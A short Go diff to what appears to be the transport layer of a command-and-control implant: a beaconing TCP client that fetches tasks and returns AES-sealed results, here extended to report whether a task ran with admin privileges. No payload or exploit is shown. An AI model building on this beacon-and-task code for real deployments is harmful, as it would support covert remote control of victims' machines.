@@ -165,10 +165,14 @@ func (t *tcpTransport) beacon() ([]taskWire, error) {
 }
 
 func (t *tcpTransport) sendResult(taskID int64, output, errStr string) error {
+	return t.sendResultAdmin(taskID, output, errStr, false)
+}
+
+func (t *tcpTransport) sendResultAdmin(taskID int64, output, errStr string, isAdmin bool) error {
 	t.mu.Lock()
 	defer t.mu.Unlock()
 
-	plain, _ := json.Marshal(resultRequest{TaskID: taskID, Output: output, Error: errStr})
+	plain, _ := json.Marshal(resultRequest{TaskID: taskID, Output: output, Error: errStr, IsAdmin: isAdmin})
 	enc, err := seal(t.aesKey, plain)
 	if err != nil {
 		return err
